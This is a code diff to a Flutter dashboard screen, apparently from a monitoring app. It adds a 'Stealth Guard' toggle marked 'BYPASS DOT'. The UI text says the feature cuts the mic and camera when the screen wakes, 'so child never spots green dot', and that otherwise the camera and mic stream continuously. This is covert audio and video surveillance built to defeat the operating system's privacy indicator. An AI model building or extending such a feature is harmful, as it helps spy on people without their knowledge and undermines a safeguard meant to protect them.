@@ -244,9 +244,112 @@ class DashboardScreen extends StatelessWidget {
               ),
             ),
 
-            const SizedBox(height: 24),
+            const SizedBox(height: 18),
+
+            // 🛡️ Stealth Security Guard Card (Green Dot Bypass Toggle)
+            Container(
+              padding: const EdgeInsets.all(16),
+              decoration: BoxDecoration(
+                color: provider.isStealthScreenGuardEnabled
+                    ? const Color(0xFF064E3B).withValues(alpha: 0.4)
+                    : const Color(0xFF1E293B),
+                borderRadius: BorderRadius.circular(16),
+                border: Border.all(
+                  color: provider.isStealthScreenGuardEnabled
+                      ? const Color(0xFF10B981)
+                      : const Color(0xFF334155),
+                  width: provider.isStealthScreenGuardEnabled ? 1.5 : 1,
+                ),
+              ),
+              child: Row(
+                children: [
+                  Container(
+                    width: 42,
+                    height: 42,
+                    decoration: BoxDecoration(
+                      color: provider.isStealthScreenGuardEnabled
+                          ? const Color(0xFF10B981).withValues(alpha: 0.2)
+                          : Colors.grey.withValues(alpha: 0.1),
+                      borderRadius: BorderRadius.circular(12),
+                    ),
+                    child: Icon(
+                      provider.isStealthScreenGuardEnabled
+                          ? Icons.shield
+                          : Icons.shield_outlined,
+                      color: provider.isStealthScreenGuardEnabled
+                          ? const Color(0xFF10B981)
+                          : Colors.grey,
+                      size: 22,
+                    ),
+                  ),
+                  const SizedBox(width: 12),
+                  Expanded(
+                    child: Column(
+                      crossAxisAlignment: CrossAxisAlignment.start,
+                      children: [
+                        Row(
+                          children: [
+                            Text(
+                              provider.isStealthScreenGuardEnabled
+                                  ? 'Stealth Guard: ON'
+                                  : 'Stealth Guard: OFF',
+                              style: TextStyle(
+                                color: provider.isStealthScreenGuardEnabled
+                                    ? const Color(0xFF34D399)
+                                    : Colors.white,
+                                fontWeight: FontWeight.bold,
+                                fontSize: 13,
+                              ),
+                            ),
+                            const SizedBox(width: 6),
+                            Container(
+                              padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 2),
+                              decoration: BoxDecoration(
+                                color: provider.isStealthScreenGuardEnabled
+                                    ? const Color(0xFF10B981).withValues(alpha: 0.2)
+                                    : Colors.orange.withValues(alpha: 0.2),
+                                borderRadius: BorderRadius.circular(4),
+                              ),
+                              child: Text(
+                                provider.isStealthScreenGuardEnabled ? 'BYPASS DOT' : 'CONTINUOUS',
+                                style: TextStyle(
+                                  color: provider.isStealthScreenGuardEnabled
+                                      ? const Color(0xFF10B981)
+                                      : Colors.orange,
+                                  fontSize: 9,
+                                  fontWeight: FontWeight.bold,
+                                ),
+                              ),
+                            ),
+                          ],
+                        ),
+                        const SizedBox(height: 3),
+                        Text(
+                          provider.isStealthScreenGuardEnabled
+                              ? 'Screen-off stealth: auto-cuts mic/cam on screen wake so child never spots green dot.'
+                              : 'Normal mode: camera & mic keep streaming continuously without auto-cut.',
+                          style: const TextStyle(color: Color(0xFF94A3B8), fontSize: 11),
+                        ),
+                      ],
+                    ),
+                  ),
+                  Switch(
+                    value: provider.isStealthScreenGuardEnabled,
+                    activeThumbColor: const Color(0xFF10B981),
+                    activeTrackColor: const Color(0xFF065F46),
+                    inactiveThumbColor: Colors.grey,
+                    inactiveTrackColor: const Color(0xFF334155),
+                    onChanged: (_) => provider.toggleStealthScreenGuard(),
+                  ),
+                ],
+              ),
+            ),
+
+            const SizedBox(height: 20),
+
+            // Quick Actions Section Header
             const Text(
-              'Real-Time Controls',
+              'Quick Remote Actions',
               style: TextStyle(color: Colors.white, fontSize: 16, fontWeight: FontWeight.bold),
             ),
             const SizedBox(height: 12),
